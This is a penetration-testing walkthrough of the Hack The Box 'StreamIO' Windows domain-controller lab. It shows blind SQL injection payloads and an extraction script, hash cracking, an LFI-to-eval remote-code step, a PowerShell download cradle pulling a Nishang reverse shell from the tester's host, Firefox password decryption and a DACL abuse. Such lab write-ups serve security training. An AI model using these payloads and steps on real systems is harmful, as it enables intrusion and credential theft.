---
title: "StreamIO"
description: "[oliver@Streamio.htb] - revealed from intial enumeration"
date: 2026-05-03
platform: "Hack The Box"
os: "Windows"
difficulty: "Medium"
tags: ["walkthrough", "htb", "bloodhound"]
---

**Difficulty:** Hard 
**OS:** Windows  
**Type:** Active Directory  
**IP:** `10.129.38.65`

## Reconnaissance

### Nmap Scan
```bash
┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/StreamIO]
└─$ sudo nmap -sC 10.129.37.195 -p- -Pn -A -T4 -vv

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-05-02 07:41:49Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: streamIO.htb, Site: Default-First-Site-Name)
443/tcp   open  ssl/https?    syn-ack ttl 127
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Issuer: commonName=streamIO/countryName=EU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-02-22T07:03:28
| Not valid after:  2022-03-24T07:03:28
| MD5:     b99a 2c8d a0b8 b10a eefa be20 4abd ecaf
| SHA-1:   6c6a 3f5c 7536 61d5 2da6 0e66 75c0 56ce 56e4 656d
| SHA-256: 1efc 48cc 0bd9 757f c585 d1fb 7e52 5009 ed0a a3e9 9acc 1a97 0b26 8418 6801 bf09
| -----BEGIN CERTIFICATE-----
| MIIDYjCCAkqgAwIBAgIUbdDRZxR55nbfMxJzBHWVXcH83kQwDQYJKoZIhvcNAQEL
| BQAwIDELMAkGA1UEBhMCRVUxETAPBgNVBAMMCHN0cmVhbUlPMB4XDTIyMDIyMjA3
| MDMyOFoXDTIyMDMyNDA3MDMyOFowIDELMAkGA1UEBhMCRVUxETAPBgNVBAMMCHN0
| cmVhbUlPMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2QSO8noWDU+A
| MYuhSMrB2mA+V7W2gwMdTHxYK0ausnBHdfQ4yGgAs7SdyYKXf8fA502x4LvYwgmd
| 67QtQdYtsTSv63SlnEW3zjJyu/dRW0cwMfBCqyiLgAScrxb/6HOhpnOAzk0DdBWE
| 2vobsSSAh+cDHVSuSbEBLqJ0GEL4hcggHhQq6HLRmmrb0wGjL1WIwjQ8cCWcFzzw
| 5Xe3gEe+aHK245qZKrZtHuXelFe72/nbF8VFiukkaBMgoh6VfpM66nMzy+KeLfhP
| FkxBt6osGUHwSnocJknc7t+ySRVTACAMPjbbPGEl4hvNEcZpepep6jD6qgi4k7bL
| 82Nu2AeSIQIDAQABo4GTMIGQMB0GA1UdDgQWBBRf0ALWCgvVfRgijR2I0KY0uRjY
| djAfBgNVHSMEGDAWgBRf0ALWCgvVfRgijR2I0KY0uRjYdjAPBgNVHRMBAf8EBTAD
| AQH/MCsGA1UdEQQkMCKCDHN0cmVhbUlPLmh0YoISd2F0Y2guc3RyZWFtSU8uaHRi
| MBAGA1UdIAQJMAcwBQYDKgMEMA0GCSqGSIb3DQEBCwUAA4IBAQCCAFvDk/XXswL4
| cP6nH8MEkdEU7yvMOIPp+6kpgujJsb/Pj66v37w4f3us53dcoixgunFfRO/qAjtY
| PNWjebXttLHER+fet53Mu/U8bVQO5QD6ErSYUrzW/l3PNUFHIewpNg09gmkY4gXt
| oZzGN7kvjuKHm+lG0MunVzcJzJ3WcLHQUcwEWAdSGeAyKTfGNy882YTUiAC3p7HT
| 61PwCI+lO/OU52VlgnItRHH+yexBTLRB+Oa2UhB7GnntQOR1S5g497Cs3yAciST2
| JaKhcCnBY1cWqUSAm56QK3mz55BNPcOUHLhrFLjIaWRVx8Ro8QOCWcxkTfVcKcR+
| DSJTOJH8
|_-----END CERTIFICATE-----
|_ssl-date: 2026-05-02T07:43:51+00:00; +7h00m00s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: streamIO.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49703/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.98%E=4%D=5/2%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=69F548CE%P=x86_64-pc-linux-gnu)
SEQ(SP=103%GCD=1%ISR=10B%TI=I%II=I%SS=S%TS=U)
SEQ(SP=106%GCD=1%ISR=10D%TI=I%TS=U)
OPS(O1=M542NW8NNS%O2=M542NW8NNS%O3=M542NW8%O4=M542NW8NNS%O5=M542NW8NNS%O6=M542NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M542NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-05-02T07:42:47
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 46644/tcp): CLEAN (Timeout)
|   Check 2 (port 62857/tcp): CLEAN (Timeout)
|   Check 3 (port 59999/udp): CLEAN (Timeout)
|   Check 4 (port 43746/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   89.67 ms 10.10.16.1
2   89.78 ms 10.129.37.195

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 01:43
Completed NSE at 01:43, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 01:43
Completed NSE at 01:43, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 01:43
Completed NSE at 01:43, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 253.71 seconds
           Raw packets sent: 131223 (5.778MB) | Rcvd: 137 (7.022KB)

```

| Port | Service  | Info                                  |
| ---- | -------- | ------------------------------------- |
| 53   | DNS      | Simple DNS Plus                       |
| 80   | HTTP     | Microsoft IIS 10.0                    |
| 88   | Kerberos | Active Directory                      |
| 389  | LDAP     | Domain: streamIO.htb                  |
| 443  | HTTPS    | SAN: streamIO.htb, watch.streamIO.htb |
| 445  | SMB      | Signing required                      |
| 5985 | WinRM    | Remote Management                     |
| 9389 | mc-nmf   | .NET Message Framing                  |

> The SSL certificate reveals a second subdomain: `watch.streamIO.htb`

### Web Enumeration

**streamio.htb**

![Image](../../assets/images/Pasted-image-20260502021235.png)

**wactch.streamio.htb**

![Image](../../assets/images/Pasted-image-20260502020430.png)

**subdomain brute force**
```bash
┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/StreamIO]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains top1million-5000.txt -u https://streamio.htb -H "Host: FUZZ.streamio.htb" -fc 301,302 -t 50
```

**Directory brute forcing of stream.io**

```bash

┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/StreamIO]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://streamio.htb/FUZZ -e .php,.asp,.aspx -fc 301,302,404 -t 50
```


![Image](../../assets/images/Pasted-image-20260503020652.png)


![Image](../../assets/images/Pasted-image-20260503001111.png)

`[oliver@Streamio.htb] - revealed from intial enumeration

> 
>- `streamio.htb/admin/` → FORBIDDEN (needs auth)
? - `watch.streamio.htb/search.php` → Movie search endpoint 
? - About page reveals staff names: **Barry, Oliver, Samantha**
? - **Email leaked**: `oliver@streamio.htb`

**Directory Brute forcing directories of watch.streamio.htb**

```bash
┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/StreamIO]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://watch.streamio.htb/FUZZ -e .php,.asp,.aspx -fc 301,302,404 -t 50
```
![Image](../../assets/images/Pasted-image-20260503001351.png)

## SQL Injection
![Image](../../assets/images/Pasted-image-20260503001503.png)

### Vulnerability
The POST parameter `q` in `search.php` is vulnerable to **boolean-based blind SQL injection**.  
The WAF aggressively blocks sqlmap - manual exploitation required.

![Image](../../assets/images/Pasted-image-20260503003439.png)


```bash
┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/StreamIO]
└─$ sqlmap -r search.req --batch --level 3 --risk 2 --dbms=mssql --dbs
```

![Image](../../assets/images/Pasted-image-20260503003951.png)

we would be using exact payload from the sqlmap to inject and enumerate manually since its blocking sqlmap heavily

 **TRUE condition → 4813 bytes**
```bash
┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/StreamIO]
└─$ curl -k -s -X POST "https://watch.streamio.htb/search.php" --data "q=gu%' AND 9083=9083 AND 'JFdc%'='JFdc" | wc -c

4813
```

**FALSE condition → 1031 bytes**
```bash
┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/StreamIO]
└─$ curl -k -s -X POST "https://watch.streamio.htb/search.php" --data "q=gu%' AND substring(@@version,1,1)='5' AND 'JFdc%'='JFdc" | wc -c
1031
```

**MSSQL → 4813 (TRUE) **

```bash
curl -k -s -X POST "https://watch.streamio.htb/search.php" --data "q=gu%' AND substring(@@version,1,1)='M' AND 'JFdc%'='JFdc" | wc -c
4813
```

**Extraction Script**

```python
import requests, string, warnings
warnings.filterwarnings("ignore")

url = "https://watch.streamio.htb/search.php"
chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + "._-@"

def check(payload):
    r = requests.post(url, data={"q": payload}, verify=False)
    return len(r.content) > 1031

def extract(query):
    result = ""
    pos = 1
    while True:
        found = False
        for c in chars:
            payload = f"gu%' AND substring(({query}),{pos},1)='{c}' AND 'JFdc%'='JFdc"
            if check(payload):
                result += c
                print(f"\r[+] {result}", end="", flush=True)
                pos += 1
                found = True
                break
        if not found:
            print()
            break
    return result

# Enumerate databases
dbs = []
for i in range(10):
    exclude = ",".join(f"'{d}'" for d in dbs)
    where = f"WHERE name NOT IN ({exclude})" if dbs else ""
    db = extract(f"SELECT TOP 1 name FROM master..sysdatabases {where}")
    if db:
        dbs.append(db)
    else:
        break

print("\n[*] Databases:", dbs)

```

 **Databases Found** from the script 
```bash
┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/StreamIO]
└─$ python3 extractor.py
[*] Extracting databases...
[+] master
[+] DB 1: master
[+] tempdb
[+] DB 2: tempdb
[+] model
[+] DB 3: model
[+] msdb
[+] DB 4: msdb
[+] streamio
[+] DB 5: streamio
[+] streamio_backup
[+] DB 6: streamio_backup                                                                           
[*] Done: ['master', 'tempdb', 'model', 'msdb', 'streamio', 'streamio_backup']                      
[ble: elapsed 392.457s (CPU 4.7%)] python3 extractor.py

```

similiarly we can extract all the username and password from the db

```python
# Dump columns from users table
cols = []
for i in range(10):
    exclude = ",".join(f"'{c}'" for c in cols)
    where = f"WHERE table_name='users' AND column_name NOT IN ({exclude})" if cols else "WHERE table_name='users'"
    col = extract(f"SELECT TOP 1 column_name FROM streamio.information_schema.columns {where}")
    if col:
        cols.append(col)
    else:
        break

# Dump usernames and passwords
usernames = []
for i in range(30):
    exclude = ",".join(f"'{u}'" for u in usernames)
    where = f"WHERE username NOT IN ({exclude})" if usernames else ""
    username = extract(f"SELECT TOP 1 username FROM streamio..users {where}")
    if username:
        password = extract(f"SELECT TOP 1 password FROM streamio..users WHERE username='{username}'")
        print(f"[+] {username}:{password}")
        usernames.append(username)
    else:
        break
```

### Cracked Hashes
```bash
┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/StreamIO]
└─$ hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

```bash

3577c47eb1e12c8ba021611e1280753c:highschoolmusical  
ee0b8a0937abd60c2882eacb2f8dc49f:physics69i    
665a50ac9eaa781e4f7f04199db97a11:paddpadd      
b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..   
ef8f3d30a856cf166fb8215aca93e9ff:%$clara            2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$     54c88b2dbd7b1a84012fabc1a4c73415:$hadoW             6dcd87740abb64edfa36d170f0d5450d:$3xybitch          08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123## 
b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!    
b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123     
f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$   
```

## Foothold

All the  hash has been lets try to login on stream.io page using these credentials
Before these i tried to register an account on the streamio.htb i couldnt loggin with credentials 

Request

```http 
POST /login.php HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=5m2slsjq5oljhnrem8rlu9ndvc
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
Origin: https://streamio.htb
Referer: https://streamio.htb/login.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=hi&password=hi
```

Response
![Image](../../assets/images/Pasted-image-20260503020156.png)

lets try to loggin with the founded credentials using hydra we can check all the credentials

```bash
┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/StreamIO]
└─$ hydra -L user.txt -P password.txt streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Failed" -t 10

```

>`yoshihide : 66boysandgirls.. `

Now we have the access to admin panel
![Image](../../assets/images/Pasted-image-20260503020739.png)

Lets try  directory brute forcing on it and  on the parameter .. for the payload lets try to brute force using fuff

```bash
 ┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/StreamIO]
└─$ ffuf -u "https://streamio.htb/admin/?FUZZ="-w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -b "PHPSESSID=9njlrsv69pstqso13j7rr8fkj3" -k -mc 200 -fs 1678


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://streamio.htb/admin/?FUZZ=
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 :: Header           : Cookie: PHPSESSID=9njlrsv69pstqso13j7rr8fkj3
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
 :: Filter           : Response size: 1678
________________________________________________

user                    [Status: 200, Size: 1702, Words: 86, Lines: 51, Duration: 40ms]
staff                   [Status: 200, Size: 12484, Words: 1784, Lines: 399, Duration: 40ms]
movie                   [Status: 200, Size: 320235, Words: 15986, Lines: 10791, Duration: 50ms]
debug                   [Status: 200, Size: 1712, Words: 90, Lines: 50, Duration: 33ms]
:: Progress: [220560/220560] :: Job [1/1] :: 873 req/sec :: Duration: [0:04:47] :: Errors: 0 ::
[ble: elapsed 287.638s (CPU 55.4%)] ffuf -u "https://streamio.htb/admin/?FUZZ=" \
 ```

### LFI via `?debug=`
The `debug` parameter includes files directly with no sanitization:

```bash
┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/StreamIO]
└─$ curl -k -s "https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php" -b "PHPSESSID=9njlrsv69pstqso13j7rr8fkj3" 
```

its does reveal base64 encoded seceret 
```php
<?php
define('included',true);
session_start();
if(!isset($_SESSION['admin']))
{
	header('HTTP/1.1 403 Forbidden');
	die("<h1>FORBIDDEN</h1>");
}
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Admin panel</title>
	<link rel = "icon" href="/images/icon.png" type = "image/x-icon">
	<!-- Basic -->
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<!-- Mobile Metas -->
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
	<!-- Site Metas -->
	<meta name="keywords" content="" />
	<meta name="description" content="" />
	<meta name="author" content="" />

<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>

	<!-- Custom styles for this template -->
	<link href="/css/style.css" rel="stylesheet" />
	<!-- responsive style -->
	<link href="/css/responsive.css" rel="stylesheet" />

</head>
<body>
	<center class="container">
		<br>
		<h1>Admin panel</h1>
		<br><hr><br>
		<ul class="nav nav-pills nav-fill">
			<li class="nav-item">
				<a class="nav-link" href="?user=">User management</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="?staff=">Staff management</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="?movie=">Movie management</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="?message=">Leave a message for admin</a>
			</li>
		</ul>
		<br><hr><br>
		<div id="inc">
			<?php
				if(isset($_GET['debug']))
				{
					echo 'this option is for developers only';
					if($_GET['debug'] === "index.php") {
						die(' ---- ERROR ----');
					} else {
						include $_GET['debug'];
					}
				}
				else if(isset($_GET['user']))
					require 'user_inc.php';
				else if(isset($_GET['staff']))
					require 'staff_inc.php';
				else if(isset($_GET['movie']))
					require 'movie_inc.php';
				else 
			?>
		</div>
	</center>
</body>
</html>
```

>**Source code reveals:**
   DB credentials: `db_admin : B1@hx31234567890`
   The `debug` parameter does `include $_GET['debug']` with 
   zero sanitization

we can decode using burpsuite using decoder option
from the code  their is three php file which file which can be read through indivadually using LFI

While reading file  none of those reveal anything specifcally just deleting the id thats it

example similiar other 2 as well so its an dead end

```php
<?php
if(!defined('included'))
        die("Only accessable through includes");
if(isset($_POST['user_id']))
{
$query = "delete from users where is_staff = 0 and id = ".$_POST['user_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from users where is_staff = 0";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>
```

lets try to brute force the file names

```bash

┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/StreamIO]
└─$ ffuf -u "https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=FUZZ.php"-w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -b "PHPSESSID=9njlrsv69pstqso13j7rr8fkj3" -k -mc 200 -fw 180 -fs 1712

```
![Image](../../assets/images/Pasted-image-20260503025405.png)
**Found:** `master.php` -  contains critical `eval()` sink:
```bash
┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/StreamIO]
└─$ curl -k -s "https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php" \
  -b cookie.txt | grep -oP '[A-Za-z0-9+/=]{100,}' | base64 -d
```

![Image](../../assets/images/Pasted-image-20260503025612.png)

>`eval()` executes raw PHP code  **no** `<?php ?>` tags needed in the payload.  
   The function fetches a remote URL and evals its content.

### Testing RCE 

**shell.php - raw PHP, no tags**

```bash
┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/StreamIO]
└─$ cat shell.php 
system("whoami");

```

`Terminal 1`
```bash
python3 -m http.server 80
```

**Trigger eval()**
`Terminal 2`
```bash
┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/StreamIO]
└─$ curl -k -s -X POST "https://streamio.htb/admin/?debug=master.php" -b cookie.txt --data "include=http://10.10.16.99/shell.php" | grep -v "form\|div\|style\|class\|href\|link\|script\|meta" | tr -s '\n'

---snip ---
<br><hr><br>
<h1>User managment</h1>
<br><hr><br>
<input name="include" hidden>
streamio\yoshihide
        </center>
</body>
</html>

```


**Output:** `streamio\yoshihide` has been confirmed to be user and RCE is confirmed 

**Start listener**
```bash
┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/StreamIO]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

**Update shell.php with download cradle:**

```bash
echo 'system("powershell -c \"IEX(New-Object Net.WebClient).DownloadString('"'"'http://10.10.16.99/rev.ps1'"'"')\"");' > shell.php
```

**creating reverseshell payload** 
```powershell
cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 rev.ps1
echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.99 -Port 4444" >> rev.ps1
```

**Host and trigger:**
```bash
curl -k -s -X POST "https://streamio.htb/admin/?debug=master.php" -b cookie.txt --data "include=http://10.10.16.99/shell.php"
```

**Shell received as:** `streamio\yoshihide`
```bash
┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/StreamIO]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.99] from (UNKNOWN) [10.129.38.65] 57593
Windows PowerShell running as user DC$ on DC
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\inetpub\streamio.htb\admin>whoami
streamio\yoshihide
PS C:\inetpub\streamio.htb\admin> 

```


## Lateral Movement

### Enumeration

```bash
PS C:\inetpub\streamio.htb\admin> whoami
streamio\yoshihide
```

**Low privileges**
```bash
PS C:\inetpub\streamio.htb\admin> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```
**Administrator, Guest, JDgodd, krbtgt, Martin, nikk37, yoshihide **
```bash
PS C:\inetpub\streamio.htb\admin> net user

User accounts for \\DC

-------------------------------------------------------------------------------
Administrator            Guest                    JDgodd                   
krbtgt                   Martin                   nikk37                   
yoshihide                
The command completed successfully.

PS C:\inetpub\streamio.htb\admin> net localgroup Administrator
PS C:\inetpub\streamio.htb\admin> 

PS C:\inetpub\streamio.htb\admin> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
Martin
The command completed successfully.

PS C:\inetpub\streamio.htb\admin> 

```

**findings:**

- `Martin` is a local Administrator
- `nikk37` and `JDgodd` are domain users
### streamio_backup Database

we can use the earlier  found  credentail to check the streamio_backup table using sqlcmd

```bash
PS C:\inetpub\streamio.htb\admin> sqlcmd -S localhost -U db_admin -P "B1@hx31234567890" -Q "SELECT * FROM streamio_backup..users"
```

![Image](../../assets/images/Pasted-image-20260503032040.png)

nikk37 wasnt thier before on db so we can try to crack his password using hash cat
```bash
──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/StreamIO]
└─$ hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

```

**Cracked**: `nikk37:get_dem_girls2@yahoo.com 

### Evil-WinRM as nikk37

Lets verfy the password with smb and winrm using crackmapexec
![Image](../../assets/images/Pasted-image-20260503032350.png)

```bash
evil-winrm -i streamio.htb -u nikk37 -p "get_dem_girls2@yahoo.com"
```

we can grab the user.txt

## Prive Escalation

```bash
*Evil-WinRM* PS C:\Users\nikk37\Desktop> whoami /priv
                                                                                                     
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

https://www.0xczr.com/tools/cred_hunting/
For crendtial hunting i used this website as checklist to enumerate the windows credential

**Firefox Credential Extraction**
nikk37 has a Firefox profile with saved passwords:
```bash
*Evil-WinRM* PS C:\Users\nikk37\Documents> download "C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\logins.json"

```

```bash
*Evil-WinRM* PS C:\Users\nikk37\Documents> download "C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db"

```

we can use a tool called firpwd to decrypt the password 

```bash
git clone https://github.com/lclevy/firepwd.git
```

```bash
python3 firepwd.py -d "/home/penguin/Downloads/BloodHound/Collectors/GhostPack"

```
**Decrypted credentials from `slack.streamio.htb`:**

```bash
Using 3DES (32-byte key, truncated to 24)
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'

```

**Valid credential:** `JDgodd : JDg0dd1s@d0p3cr3@t0r`
```bash
┌──(penguin㉿0X0F)-[~/Downloads/BloodHound/Collectors/GhostPack/firepwd]
└─$ crackmapexec smb streamio.htb -u JDgodd -p "JDg0dd1s@d0p3cr3@t0r"
SMB         streamIO.htb    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         streamIO.htb    445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r 
```

access to smb  and used `smbmap` to recurse and find an useful share only defualt share with not write accesss
only
### BloodHound Enumeration
Used bloodhound to find attack path
```bash
┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/StreamIO]
└─$ bloodhound-python -u JDgodd -p "JDg0dd1s@d0p3cr3@t0r" -d streamio.htb -ns 10.129.38.65 -c all
```

From bloodhound we found and path for an attack
**Attack path discovered:**
```

JDgodd --[Owns]--> CORE STAFF --[ReadLAPSPassword]--> DC.STREAMIO.HTB
```


![Image](../../assets/images/Pasted-image-20260503040011.png)
JDgodd owns  STAFF@STREAMIO.HTB

**DACL Abuse Adding JDgodd to CORE STAFF**

**Step 1 — Grant WriteMembers on STAFF:**
```bash
┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/StreamIO]
└─$ /home/penguin/.local/share/pipx/venvs/impacket/bin/dacledit.py -action 'write' -rights 'WriteMembers' -principal 'JDgodd' -target-dn 'CN=CORE STAFF,CN=Users,DC=streamIO,DC=htb' 'streamio.htb'/'JDgodd':'JDg0dd1s@d0p3cr3@t0r'
```

**Add JDgodd to the group:**
```bash
net rpc group members "CORE STAFF" -U "streamio.htb"/"JDgodd"%"JDg0dd1s@d0p3cr3@t0r" -S 10.129.38.65
```

**Verify**
```bash
┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/StreamIO]
└─$ net rpc group members "CORE STAFF" -U "streamio.htb"/"JDgodd"%"JDg0dd1s@d0p3cr3@t0r" -S 10.129.38.65
streamIO\JDgodd

```
